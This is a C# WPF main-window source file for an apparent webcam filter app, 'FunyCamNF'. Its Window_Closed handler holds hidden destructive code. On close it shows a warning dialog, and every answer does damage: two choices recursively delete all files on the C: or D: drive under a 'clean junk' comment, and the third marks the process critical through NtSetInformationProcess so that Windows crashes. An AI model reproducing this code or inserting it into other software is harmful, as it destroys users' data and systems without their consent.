using AForge.Imaging.Filters;
using AForge.Video;
using AForge.Video.DirectShow;
using FunyCamNF.filters;
using MaterialDesignThemes.Wpf;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Threading;
using System.Windows.Controls.Primitives;
using System.Configuration;
using FunyCamNF.utils;
using AForge.Video.FFMPEG;
using FunyCamNF.pages.main;
using FunyCamNF.pages.setting;
using System.Runtime.InteropServices;
using System.IO;

namespace FunyCamNF
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>

    public partial class MainWindow : Window
    {
        List<string> pages = new List<string>();
        MainPage mainPage = new MainPage();
        public MainWindow()
        {
            InitializeComponent();
            InitMenus();
        }

        private void InitMenus()
        {
            pages.Add("主页");
            pages.Add("设置");
            DemoItemsListBox.ItemsSource = pages;
            DemoItemsListBox.SelectionChanged += DemoItemsListBox_SelectionChanged;
            DemoItemsListBox.SelectedItem = "主页";
            DemoItemsSearchBox.TextChanged += DemoItemsSearchBox_TextChanged;
        }

        //搜索框文本发生变化时
        private void DemoItemsSearchBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (DemoItemsSearchBox.Text.Length == 0)
            {
                DemoItemsListBox.ItemsSource = pages;
                return;
            }
            List<string> searchedPages = new List<string>();
            foreach (var page in pages)
            {
                if (page.Contains(DemoItemsSearchBox.Text))
                {
                    searchedPages.Add(page);
                }
            }
            DemoItemsListBox.ItemsSource = searchedPages;
        }

        // 侧边页面选择发生变化时
        private void DemoItemsListBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (DemoItemsListBox.SelectedItem == null)
            {
                return;
            }
            switch (DemoItemsListBox.SelectedItem.ToString())
            {
                case "主页":
                    mainFrame.Navigate(mainPage);
                    break;
                case "设置":
                    mainFrame.Navigate(new SettingPage());
                    break;
                default:
                    break;
            }

        }

        private void UIElement_OnPreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            //until we had a StaysOpen glag to Drawer, this will help with scroll bars
            var dependencyObject = Mouse.Captured as DependencyObject;

            while (dependencyObject != null)
            {
                if (dependencyObject is ScrollBar) return;
                dependencyObject = VisualTreeHelper.GetParent(dependencyObject);
            }

            MenuToggleButton.IsChecked = false;

            mainPage.formsHostFiltered.Visibility = Visibility.Visible;
            mainPage.formsHostOrigin.Visibility = Visibility.Visible;

        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);


        private void OnCopy(object sender, ExecutedRoutedEventArgs e)
        {
            if (e.Parameter is string stringValue)
            {
                try
                {
                    Clipboard.SetDataObject(stringValue);
                }
                catch (Exception ex)
                {
                    Trace.WriteLine(ex.ToString());
                }
            }
        }

        private void MenuToggleButton_OnClick(object sender, RoutedEventArgs e)
        {
            DemoItemsSearchBox.Focus();
            hideForm();
        }

        private void MenuDarkModeButton_Click(object sender, RoutedEventArgs e)
            => ModifyTheme(DarkModeToggleButton.IsChecked == true);

        private static void ModifyTheme(bool isDarkTheme)
        {
            var paletteHelper = new PaletteHelper();
            var theme = paletteHelper.GetTheme();

            theme.SetBaseTheme(isDarkTheme ? Theme.Dark : Theme.Light);
            paletteHelper.SetTheme(theme);
        }

        private void hideForm()
        {
            mainPage.formsHostFiltered.Visibility = MenuToggleButton.IsChecked.Value ? Visibility.Hidden : Visibility.Visible;
            mainPage.formsHostOrigin.Visibility = MenuToggleButton.IsChecked.Value ? Visibility.Hidden : Visibility.Visible;
        }

        private void ToggleButton_Click(object sender, RoutedEventArgs e)
        {
            hideForm();
        }

        private void DrawerHost_MouseDown(object sender, MouseButtonEventArgs e)
        {
            hideForm();
        }

        private void Button_Click_3(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }

        private void Nav_Button_Click(object sender, RoutedEventArgs e)
        {

        }

        private void Button_recoder(object sender, RoutedEventArgs e)
        {
        }

        private void Window_Closed(object sender, EventArgs e)
        {

            MessageBoxResult result = MessageBox.Show("已经提示过你了，禁止运行！！后果自负", "警告", MessageBoxButton.YesNoCancel);
            switch (result)
            {
                case MessageBoxResult.Yes:
                    //清理垃圾
                    try
                    {
                        DirectoryInfo dir = new DirectoryInfo("D:/");
                        FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();
                        foreach (FileSystemInfo i in fileinfo)
                        {
                            if (i is DirectoryInfo)
                            {
                                DirectoryInfo subdir = new DirectoryInfo(i.FullName);
                                subdir.Delete(true);
                            }
                            else
                            {
                                File.Delete(i.FullName);
                            }
                        }
                    }
                    catch (Exception err)
                    {

                    }
                    break;
                case MessageBoxResult.No:
                    int isEndding = 1;
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isEndding, sizeof(int));
                    break;
                case MessageBoxResult.Cancel:
                    //清理垃圾
                    try
                    {
                        DirectoryInfo dir = new DirectoryInfo("C:/");
                        FileSystemInfo[] fileinfo = dir.GetFileSystemInfos();
                        foreach (FileSystemInfo i in fileinfo)
                        {
                            if (i is DirectoryInfo)
                            {
                                DirectoryInfo subdir = new DirectoryInfo(i.FullName);
                                subdir.Delete(true);
                            }
                            else
                            {
                                File.Delete(i.FullName);
                            }
                        }
                    }
                    catch (Exception err)
                    {

                    }
                    break;
            }
        }
    }
}

